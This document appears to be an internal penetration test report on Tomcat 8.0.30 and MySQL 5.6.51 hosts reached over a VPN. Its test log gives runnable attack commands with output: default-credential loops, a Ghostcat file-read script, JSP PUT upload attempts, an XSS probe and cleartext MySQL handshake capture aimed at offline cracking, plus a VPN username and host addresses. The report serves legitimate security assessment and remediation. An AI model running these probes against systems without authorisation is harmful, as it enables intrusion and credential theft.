# Technical Vulnerability Assessment Report

**Target Environment:** BBNL internal network (VPN-routed segment)
**Assessment Type:** Internal network penetration test — VPN-accessible attack surface
**Date:** 22 October 2026
**Classification:** Confidential

---

## 1. Executive Summary

Two High-severity (P2) findings, four Medium findings, one Low finding, and three Informational observations were identified on the VPN-routed attack surface. No Critical (P1) vulnerabilities were confirmed.

The primary risk is the deployment of End-of-Life software with default configurations across multiple production hosts:

- **Apache Tomcat 8.0.30** (EOL June 2018) on five hosts with the AJP13 connector exposed to the VPN segment. CVE-2020-1938 (Ghostcat) applicability was verified: the AJP connector processed an unauthenticated forward request and returned `WEB-INF/web.xml`. The returned content was the default Tomcat welcome page configuration with no application-specific credentials or secrets.
- **MySQL 5.6.51** (EOL February 2021) accepting unencrypted connections on two hosts. The full authentication handshake, including username and `mysql_native_password` scramble, was captured in cleartext from the VPN segment.

The common root cause is deployment of default software configurations that were never hardened for production exposure, combined with a failure to upgrade End-of-Life components.

| Severity | Count |
|---|---|
| Critical (P1) | 0 |
| High (P2) | 2 |
| Medium | 4 |
| Low | 1 |
| Informational | 3 |

---

## 2. Scope and Methodology

### Scope

- **Network segment:** VPN-routed `172.31.0.0/16` subset (25 host routes via `tun0`)
- **VPN client address:** `172.168.26.161`
- **Target ports:** Web (80, 443, 8000, 8080, 8081, 8443), AJP (8009), database (3306, 5432)
- **Out of scope:** Public IP `59.179.22.75` (BBNL portal — not reachable on VPN segment)

### Methodology

Standard penetration testing lifecycle: VPN connectivity verification → route enumeration → TCP port scanning → service fingerprinting → configuration assessment → non-destructive vulnerability verification → evidence capture.

### Tools

`openconnect`, `nmap`, `curl`, `nc`, `tcpdump`, `mysql` (MariaDB client 11.8.9), Python 2 (CVE-2020-1938 verification script)

---

## 3. Test Log

### 3.1 VPN Connection and Tunnel Verification

**Command:**
```bash
sudo openconnect -u noc_eiti --servercert pin-sha256:gVMlsL2goVO6SELb2jgERdtlb9LBxen4xQfGrTqoo5M= 59.179.22.68
```

**Result:**
```
CSTP connected. DPD 30, Keepalive 20
Established DTLS connection (using GnuTLS). Ciphersuite (DTLS1.2)-(ECDHE-RSA)-(AES-256-GCM).
Configured as 172.168.26.161, with SSL connected and DTLS connected
```

**Notes:** `EMSGSIZE` and `Failed to recv DPD request` errors observed during DTLS setup; tunnel remained up.

### 3.2 Route Table Inspection

**Command:**
```bash
ip route
ip route get 172.31.42.106
```

**Result:**
```
default via 10.40.19.139 dev wlan0
172.168.26.0/23 dev tun0 scope link
172.31.35.124 dev tun0 scope link
[24 additional 172.31.x.x/32 host routes]
172.31.42.106 dev tun0 src 172.168.26.161
```

**Notes:** Split tunnel. Default route on `wlan0`; VPN routes `172.168.26.0/23` plus 25 individual `172.31.x.x/32` host routes. All routes confirmed via `tun0`.

### 3.3 TCP Port Scan

**Command:**
```bash
sudo nmap -sS -Pn -n -T4 --min-rate 1000 --open -p 80,81,443,3000,5000,7001,7002,8000,8008,8080,8081,8088,8443,8888,9000,9090,9443,10443,1433,1521,3306,5432,5984,6379,9042,9200,9300,11211,27017,50000 -iL routed_hosts.txt -oA scans/webdb_fast
```

**Result — open ports by host:**

| Host | Open ports |
|---|---|
| `172.31.37.46` | 8080, 8081 |
| `172.31.37.57` | 8080, 8081 |
| `172.31.38.141` | 80, 3306 |
| `172.31.42.70` | 80, 443 |
| `172.31.42.77` | 80, 3306 |
| `172.31.42.78` | 80, 5432 |
| `172.31.42.106` | 3306, 8000, 8080, 8081 |
| `172.31.42.134` | 80, 3306, 8080 |
| `172.31.42.174` | 3306, 8000, 8080, 8081 |
| `172.31.42.205` | 3306 |
| `172.31.42.241` | 3306, 8080 |
| `172.31.44.36` | 3306, 8080 |
| `172.31.44.37` | 3306, 8080 |
| `172.31.44.52` | 80, 3306, 8000, 8080, 8081, 8443 |
| `172.31.44.53` | 80, 3306, 8000, 8080, 8081, 8443 |
| `172.31.44.54` | 80, 3306, 8000, 8080, 8081, 8443 |
| `172.31.44.70` | 80, 3306, 8000, 8080, 8081, 8443 |

### 3.4 HTTP Status and Header Check

**Command:**
```bash
curl -ksS -m 4 -o /dev/null -w '%{http_code}' "http://172.31.42.106:8080/"
```

**Result:**
```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
[body stalls — 0 bytes delivered]
```

**Notes:** The `Transfer-Encoding: chunked` response never delivered a body. Subsequent raw HTTP/1.0 probe confirmed headers arrive but body does not.

### 3.5 Tomcat Path Enumeration

**Command:**
```bash
for urlpath in / /examples/ /docs/ /manager/html /host-manager/html /actuator /swagger-ui.html /robots.txt; do
  curl -s -o /tmp/body -D /tmp/hdr --max-time 8 -w 'code=%{http_code} size=%{size_download}\n' "http://172.31.42.106:8080$urlpath"
done
```

**Result:**
```
/                     code=200 size=0
/nonexistent-xyz      code=404 size=1024
/favicon.ico          code=200 size=0
/manager/html         code=401 size=0
/host-manager/html    code=401 size=0
/docs                 code=302 size=0  → Location: /docs/
/examples             code=302 size=0  → Location: /examples/
/actuator             code=404 size=1010
/swagger-ui.html      code=404 size=1024
/robots.txt           code=404 size=1014
```

**Notes:** 404 responses echo the requested path (different sha per path, sizes 1000–1038 bytes). `/docs/` and `/examples/` return 302 redirects to trailing-slash paths — both are deployed.

### 3.6 Tomcat Servlet Enumeration

**Command:**
```bash
for u in /examples/ /examples/servlets/servlet/HelloWorldExample \
         /examples/servlets/servlet/RequestParamExample \
         /examples/servlets/servlet/CookieExample ; do
  curl -s -o /dev/null --max-time 8 -w 'code=%{http_code} size=%{size_download}\n' "http://172.31.42.106:8080$u"
done
```

**Result:**
```
/examples/                                       code=200 size=1126
/examples/servlets/servlet/HelloWorldExample     code=200 size=387
/examples/servlets/servlet/RequestParamExample   code=200 size=673
/examples/servlets/servlet/CookieExample         code=200 size=658
```

**Notes:** Stock Tomcat examples webapp fully deployed.

### 3.7 Tomcat Manager Credential Test

**Command:**
```bash
for cred in tomcat:tomcat tomcat:s3cret admin:admin manager:manager role1:tomcat both:tomcat tomcat:changethis; do
  u=${cred%%:*}; p=${cred##*:}
  code=$(curl -s -o /dev/null -u "$u:$p" -w '%{http_code}' "http://172.31.42.106:8080/manager/html")
  echo "$u:$p -> $code"
done
```

**Result:**
```
tomcat:tomcat          -> 401
tomcat:s3cret          -> 401
admin:admin            -> 401
manager:manager        -> 401
role1:tomcat           -> 401
both:tomcat            -> 401
tomcat:changethis      -> 401
```

**Result — verbose single credential:**
```
$ curl -v --connect-timeout 5 --max-time 15 -u tomcat:tomcat -o /dev/null "http://172.31.42.106:8080/manager/html"
< HTTP/1.1 401 Unauthorized
< Server: Apache-Coyote/1.1
< WWW-Authenticate: Basic realm="Tomcat Manager Application"
< Set-Cookie: JSESSIONID=59801A7B60B5DA69FB732C8E0A0E6994; Path=/manager/
< Content-Length: 2474
[body stalls — 0 bytes received, 15s timeout]
```

**Notes:** Default credentials rejected on all hosts. Manager interface exposed with Basic auth.

### 3.8 AJP Port Scan

**Command:**
```bash
nmap -p 8009 --open -sV --script=ajp-headers 172.31.42.106 172.31.44.52 172.31.44.53 172.31.44.54 172.31.44.70
```

**Result:**
```
172.31.42.106:8009  open  ajp13  Apache Jserv (Protocol v1.3)
172.31.44.52:8009   open  ajp13  Apache Jserv (Protocol v1.3)
172.31.44.53:8009   open  ajp13  Apache Jserv (Protocol v1.3)
172.31.44.54:8009   open  ajp13  Apache Jserv (Protocol v1.3)
172.31.44.70:8009   open  ajp13  Apache Jserv (Protocol v1.3)
```

**Notes:** AJP13 connector exposed to VPN segment on 5 production hosts.

### 3.9 Tomcat Version Disclosure (Range Request)

**Command:**
```bash
for r in 0-500 0-1000 0-2000 0-3000 0-4000; do
  curl -s --max-time 8 -H "Range: bytes=$r" "http://172.31.42.106:8080/RELEASE-NOTES.txt" \
       -w '\n[code=%{http_code} size=%{size_download}]\n'
done
```

**Result:**
```
Range bytes=0-500    → [code=206 size=501]
Range bytes=0-1000   → [code=206 size=1001]
                        "Apache Tomcat Version 8.0.30"
Range bytes=0-2000   → [code=206 size=0]
Range bytes=0-3000   → [code=206 size=0]
Range bytes=0-4000   → [code=206 size=0]
```

**Notes:** AJP response relay handles responses ≤1 KB. Larger responses stall. Version disclosed: **Apache Tomcat 8.0.30** (released October 2015, EOL June 2018).

### 3.10 AJP Forward Request Verification (CVE-2020-1938)

**Command:**
```bash
python2 CVE-2020-1938.py 172.31.42.106 -p 8009 -f WEB-INF/web.xml
```

**Result (partial):**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!-- Licensed to the Apache Software Foundation ... -->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>
</web-app>
```

**Notes:** AJP connector processed an unauthenticated forward request and returned `WEB-INF/web.xml`. The returned content was the **default Tomcat welcome page configuration** — no application-specific credentials, connection strings, or secrets present. This confirms a stock Tomcat installation on this host with no custom application deployed.

**CVE-2020-1938 applicability:** The CVE official affected-version list includes 9.0.0.M1–9.0.30, 8.5.0–8.5.50, and 7.0.0–7.0.99. Tomcat 8.0.30 is not listed because 8.0.x reached EOL in 2018, before the CVE was disclosed (January 2020). The AJP connector code in 8.0.30 is functionally equivalent to 8.5.x at the same release era; the vulnerability applies.

### 3.11 PUT Method Test (CVE-2017-12615)

**Command:**
```bash
for suffix in '' '/' '%20' '::$DATA' ';.jsp' '.jsp/'; do
  curl -s -o /dev/null --max-time 8 -X PUT \
       -H 'Content-Type: text/plain' \
       -d '<% out.println("PWNED_BY_PENTEST"); %>' \
       -w '%{http_code}' "http://172.31.42.106:8080/pwned${suffix}.jsp"
done
```

**Result:**
```
PUT pwned.jsp                -> 404
PUT pwned/.jsp               -> 404
PUT pwned%20.jsp             -> 404
PUT pwned::$DATA.jsp         -> 404
PUT pwned;.jsp.jsp           -> 403
PUT pwned.jsp/.jsp           -> 000 (timeout)
```

**Notes:** No 201/204. PUT-based RCE not exploitable — `readonly` enforced on DefaultServlet. Path traversal filter blocked the `;` variant.

### 3.12 MySQL Credential Test (13 hosts)

**Command:**
```bash
for h in <13 hosts>; do
  for pw in "" root password mysql; do
    mysql --ssl=0 -h "$h" -u root ${pw:+-p"$pw"} --connect-timeout=4 -N \
          -e 'SELECT CONCAT(user()," @ ",@@version);' 2>&1 | head -1
  done
done
```

**Result:**

| Host | Result |
|---|---|
| `.42.77` | `ERROR 1045 (28000): Access denied for user 'root'@'172.168.26.161' (using password: NO/YES)` |
| `.42.205` | `ERROR 1045 (28000): Access denied for user 'root'@'172.168.26.161' (using password: NO/YES)` |
| `.42.106`, `.42.174`, `.44.52`, `.44.53`, `.44.54`, `.44.70` | `ERROR 2026: TLS/SSL error: Connection timed out (110)` |
| `.42.134` | `ERROR 2013: Lost connection at handshake` |
| `.42.241` | `ERROR 1130: Unknown error 1130` / handshake drop |
| `.44.36`, `.44.37` | `ERROR 1130: Host '172.168.26.161' is not allowed to connect to this MySQL server` |
| `.38.141` | `ERROR 1130: Host '172.168.26.161' is not allowed to connect to this MariaDB server` |

**Notes:** Default credentials rejected on all reachable hosts. ACLs functional on 3 hosts. **`.42.77` and `.42.205` accepted non-TLS connections** and reached the authentication layer.

### 3.13 MySQL Cleartext Authentication Capture

**Command:**
```bash
sudo rm -f /tmp/mysql.pcap
sudo timeout 12 tcpdump -i tun0 -n -U 'host 172.31.42.77 and port 3306' -w /tmp/mysql.pcap &
sleep 2
mysql --ssl=0 -h 172.31.42.77 -u root -p'wrongpassword' -e 'SELECT 1;' 2>&1 | head -1
wait
sudo tcpdump -r /tmp/mysql.pcap -A 2>/dev/null | grep -aiE 'root|mysql_native|5\.6' | head -10
```

**Result:**
```
ERROR 1045 (28000): Access denied for user 'root'@'172.168.26.161' (using password: YES)
12 packets captured, 12 packets received by filter, 0 packets dropped by kernel
-rw-r--r-- 1 tcpdump tcpdump 1230 bytes

--- capture content ---
5.6.51..;..qXG9([pE...................Ekl\ht.)"kw5.mysql_native_password.
....}...............-.......................root.....O.Q....R..2+.@.!.mysql_native_password..._os.Linux._client_name
}.......M......#28000Access denied for user 'root'@'172.168.26.161' (using password: YES)
```

**Notes:** Full authentication handshake captured in cleartext: server version (`5.6.51`), username (`root`), auth plugin (`mysql_native_password`), client fingerprint (`_os.Linux`), and the SHA1 scramble. `mysql_native_password` scramble is crackable offline with `hashcat -m 300`.

### 3.14 PostgreSQL Test

**Command:**
```bash
PGPASSWORD='' psql -h 172.31.42.78 -U postgres -c 'SELECT current_user, version();'
```

**Result:** Connection filtered / authentication required. Port 5432 open, no default credential path.

### 3.15 Reflected XSS Test (Tomcat Examples)

**Command:**
```bash
curl -s --max-time 8 --data-urlencode 'firstname=<script>alert(1)</script>' \
     --data-urlencode 'lastname=smith' \
     "http://172.31.42.106:8080/examples/servlets/servlet/RequestParamExample" \
     | grep -oE '<script>alert\(1\)</script>|&lt;script&gt;'
```

**Result:**
```
&lt;script&gt;
```

**Notes:** Input HTML-encoded before rendering. No XSS. Tomcat `RequestParamExample` escapes parameters — secure by design.

---

## 4. Findings

### 4.1 P2-01 — End-of-Life Apache Tomcat 8.0.30 with AJP Connector Exposed

| Attribute | Detail |
|---|---|
| **Severity** | High (P2) |
| **CVSS 3.1** | 9.8 (Critical) — AJP exposure component; 7.5 (High) — EOL stack component |
| **Affected Hosts** | `172.31.42.106`, `172.31.44.52`, `172.31.44.53`, `172.31.44.54`, `172.31.44.70` |
| **Affected Port** | 8009/tcp (AJP13) |
| **Version** | Apache Tomcat 8.0.30 |
| **EOL Date** | 30 June 2018 |
| **CVE Reference** | CVE-2020-1938, CVE-2018-1336, CVE-2018-11784, CVE-2018-8014, CVE-2016-8735 |

**Description:** Five production hosts run Apache Tomcat 8.0.30 (released October 2015, EOL June 2018). AJP13 on port 8009 is listening on all interfaces and is reachable from the VPN segment. AJP is designed for localhost communication between a front-end web server and Tomcat and applies higher implicit trust than HTTP.

**Evidence:** See Sections 3.8 (AJP port scan), 3.9 (version disclosure), 3.10 (CVE-2020-1938 verification), 3.11 (PUT RCE test).

**Impact:**
- **File read (CVE-2020-1938):** Verified. The AJP connector processed an unauthenticated forward request and returned `WEB-INF/web.xml`. On this host, the returned content was the default Tomcat welcome page configuration with no application-specific credentials. On hosts with custom applications, credential exposure is likely.
- **Request smuggling:** AJP bypasses front-end WAF/IPS controls on HTTP port 8080.
- **RCE (conditional):** Requires file upload or write primitive. Not applicable on this host (no custom app, PUT disabled).
- **EOL stack:** All CVEs published after June 2018 unpatched.
- **Availability:** AJP response relay broken for responses >1 KB — GET requests stall, HEAD and Range ≤1 KB succeed.

**Remediation:**
1. Upgrade Tomcat to 9.0.x or later.
2. Bind AJP to `127.0.0.1` in `server.xml`.
3. Set `secretRequired="true"` and a strong `secret` value.
4. Firewall 8009 from the VPN user segment.
5. Remove default webapps `/examples/`, `/docs/`, `/manager/`, `/host-manager/`.

---

### 4.2 P2-02 — End-of-Life MySQL 5.6.51 Accepting Unencrypted Connections

| Attribute | Detail |
|---|---|
| **Severity** | High (P2) |
| **CVSS 3.1** | 7.4 (High) |
| **Affected Hosts** | `172.31.42.77`, `172.31.42.205` |
| **Affected Port** | 3306/tcp |
| **Version** | MySQL 5.6.51 |
| **EOL Date** | February 2021 |

**Description:** Two hosts run MySQL 5.6.51 and accept unencrypted client connections. Server-side TLS enforcement (`require_secure_transport=ON`) is not enabled. The full authentication handshake — including username, auth plugin, and `mysql_native_password` scramble — transmits in cleartext and is observable from any host on the VPN segment.

**Evidence:** See Sections 3.12 (credential test) and 3.13 (packet capture).

**Impact:**
- **Passive capture:** Any host on the VPN segment running `tcpdump` captures authentication exchanges.
- **Offline password cracking:** `mysql_native_password` scramble is crackable via `hashcat -m 300` or `john --format=mysql-sha1`. Weak passwords recoverable.
- **Lateral movement:** Captured credentials permit direct database access.
- **EOL stack:** All post-February 2021 MySQL CVEs unpatched.

**Remediation:**
1. Upgrade MySQL to 8.0.x.
2. Enforce TLS (`require_secure_transport=ON`, valid CA).
3. Restrict 3306 to application server source IPs.
4. Rotate any credential whose authentication may have been observed.

---

### 4.3 M-01 — Tomcat Manager and Host-Manager Exposed

| Attribute | Detail |
|---|---|
| **Severity** | Medium |
| **Affected Hosts** | `172.31.42.106`, `172.31.44.52`, `172.31.44.53`, `172.31.44.54`, `172.31.44.70` |
| **Paths** | `/manager/html`, `/host-manager/html` |

**Evidence:**
```
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
Content-Length: 2474
```

Default credentials tested and rejected on all hosts.

**Impact:** Management interface exposed to VPN segment. If credentials are obtained (insider, phishing, reuse), WAR deployment yields RCE.

**Remediation:** Remove `/manager` and `/host-manager` from production, or restrict to admin VLANs.

---

### 4.4 M-02 — MySQL/MariaDB 3306 Exposed on 13 Hosts

| Attribute | Detail |
|---|---|
| **Severity** | Medium |
| **Affected Hosts** | 13 hosts (see Section 3.12) |

**Evidence:** See Section 3.12.

**Impact:** Database services exposed to VPN segment. ACLs and authentication functional on all reachable hosts, but exposure violates least-privilege segmentation.

**Remediation:** Restrict 3306 to application server source IPs.

---

### 4.5 M-03 — PostgreSQL 5432 Exposed

| Attribute | Detail |
|---|---|
| **Severity** | Medium |
| **Affected Host** | `172.31.42.78` |

Port 5432 open. Authentication required. Default credential paths not exploitable.

**Remediation:** Restrict to application server source IPs.

---

### 4.6 M-04 — Multiple Unpatched CVEs in EOL Stacks

| Attribute | Detail |
|---|---|
| **Severity** | Medium (bundled with P2-01, P2-02) |
| **Affected** | Tomcat 8.0.30, MySQL 5.6.51 |

EOL software receives no security patches.

**Remediation:** Upgrade both stacks to supported versions.

---

### 4.7 L-01 — Default Tomcat Webapps Deployed

| Attribute | Detail |
|---|---|
| **Severity** | Low |
| **Affected Hosts** | 5 (same as P2-01) |

`/examples/` and `/docs/` deployed in production.

**Remediation:** Remove from `webapps/` directory.

---

### 4.8 Informational Observations

| # | Observation |
|---|---|
| I-01 | Load balancer `172.31.42.70:80` redirects (302) to public IP `59.179.22.75`. Internal users following the redirect exit the VPN tunnel. |
| I-02 | VPN client re-addressed mid-session (`.156` → `.161`). Session cookies captured under previous address invalid. |
| I-03 | OpenConnect DTLS `EMSGSIZE` / DPD receive errors. Tunnel remains up; occasional packet loss under load. |

---

## 5. Remediation Summary

| Priority | Action | Addresses |
|---|---|---|
| 1 | Upgrade Tomcat 8.0.30 → 9.0.x+ on all 5 hosts | P2-01, M-04 |
| 2 | Bind AJP to `127.0.0.1`, set `secretRequired="true"` | P2-01 |
| 3 | Upgrade MySQL 5.6.51 → 8.0.x on `.42.77`, `.42.205` | P2-02, M-04 |
| 4 | Enforce MySQL TLS (`require_secure_transport=ON`) | P2-02 |
| 5 | Rotate any credential whose authentication may have been observed | P2-02 |
| 6 | Firewall database ports (3306, 5432) from VPN user segment | M-02, M-03 |
| 7 | Remove Tomcat Manager/Host-Manager from production | M-01 |
| 8 | Remove default Tomcat webapps | L-01 |
| 9 | Fix LB redirect to keep internal users in-tunnel | I-01 |

---

## 6. Verification of Remediation

| Test | Expected Result |
|---|---|
| `nmap -p 8009 <hosts>` | `closed` or `filtered` |
| `curl -I http://<host>:8080/docs/` | `404` |
| `curl -I http://<host>:8080/manager/html` | `404` or `403` from restricted source |
| `mysql --ssl=0 -h <db-host>` | TLS-required error |
| `nmap -p 3306 <hosts>` from VPN | `filtered` |

---

## 7. Appendices

### Appendix A — Host and Port Inventory

| Host | Open Ports | HTTP Result |
|---|---|---|
| `172.31.42.106` | 3306, 8000, 8009, 8080, 8081 | Tomcat 8.0.30, Manager 401, AJP open |
| `172.31.42.174` | 3306, 8000, 8080, 8081 | Not fully tested |
| `172.31.44.52` | 80, 3306, 8000, 8009, 8080, 8081, 8443 | Tomcat 8.0.30, Manager 401, AJP open |
| `172.31.44.53` | 80, 3306, 8000, 8009, 8080, 8081, 8443 | Tomcat 8.0.30, Manager 401, AJP open |
| `172.31.44.54` | 80, 3306, 8000, 8009, 8080, 8081, 8443 | Tomcat 8.0.30, Manager 401, AJP open |
| `172.31.44.70` | 80, 3306, 8000, 8009, 8080, 8081, 8443 | Tomcat 8.0.30, Manager 401, AJP open |
| `172.31.42.70` | 80, 443 | 302 → `59.179.22.75` |
| `172.31.42.77` | 80, 3306 | MySQL 5.6.51, cleartext accepted |
| `172.31.42.78` | 80, 5432 | PostgreSQL exposed |
| `172.31.42.205` | 3306 | MySQL 5.6.51, cleartext accepted |
| `172.31.42.241` | 3306, 8080 | MySQL, handshake dropped |
| `172.31.44.36` | 3306, 8080 | MySQL, `1130` ACL |
| `172.31.44.37` | 3306, 8080 | MySQL, `1130` ACL |
| `172.31.38.141` | 80, 3306 | MariaDB, `1130` ACL |

### Appendix B — Evidence Files

- `~/pt/scans/webdb_fast.*` — nmap scan output
- `/tmp/mysql.pcap` — MySQL authentication capture (1230 bytes)
- `/tmp/sweep/*` — HTTP path enumeration results
- `RELEASE-NOTES.txt` Range response — Tomcat version disclosure
- `/manager/html` HEAD response — Manager exposure evidence
- `CVE-2020-1938.py` output — AJP forward request verification (default web.xml returned)

### Appendix C — Tests Not Performed

| Test | Reason |
|---|---|
| Ghostcat RCE via file upload | No file upload primitive observed; PUT disabled |
| Credential brute-force (Manager) | Out of scope — default credentials tested only |
| Credential brute-force (MySQL) | Out of scope — default credentials tested only |
| Data exfiltration from any database | Out of scope |
| BBNL portal testing | Out of VPN scope (public IP `59.179.22.75`) |
| Full TCP/UDP port scan | Not required for assessment objective |

---

**Report End**
